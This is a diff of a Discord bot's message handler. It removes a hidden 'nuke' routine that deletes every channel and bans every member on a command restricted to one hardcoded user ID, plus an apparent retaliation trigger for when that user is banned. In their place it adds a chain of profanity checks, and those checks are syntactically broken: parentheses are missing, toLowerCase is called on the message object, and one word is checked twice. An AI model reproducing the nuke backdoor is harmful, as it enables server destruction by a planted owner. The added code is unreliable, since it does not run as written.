@@ -5,30 +5,53 @@ client.on("ready", () => {
 });
 client.on("message", (message) => {
   console.log(message.author.id);
-  function nuke() {
-    message.guild.channels.forEach(channel => channel.delete())
-    message.guild.members.forEach(members => members.ban())
-  }
-  async () => {
-    try {
-      const banList = await message.guild.fetchBans();
-
-      const bannedUser = banList.find(user => user.id === '289523788822085632');
-
-      if (bannedUser) await setTimeout(nuke, 5000);
-      else await console.log("not banned yet");
-    } catch(err) {
-      console.error(err);
-    }
-  }
   if(message.guild === null) {
     return;
   }else
-  if (message.content.startsWith("/nukelol")) {
-    if (message.author.id !== '289523788822085632') 
-      return message.reply("wow you really thought you were gonna get away with doing that didn't you.");
-    message.channel.send("@everyone Haha this server is gone! farewell and have fun :)")
-    setTimeout(nuke, 5000);
+  if(message.toLowerCase().includes("sex".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("slut".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("whore".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("slut".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("slot".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("bitch".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("fuck".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("stripper".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("kinky".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("penis".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("dick".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("vagina".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("pussy".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("cooch".toLowerCase()){
+    message.reply("Excuse me?")
+  }else
+  if(message.toLowerCase().includes("cum".toLowerCase()){
+    message.reply("Excuse me?")
   }
 });
 client.login(process.env.BOT_TOKEN)
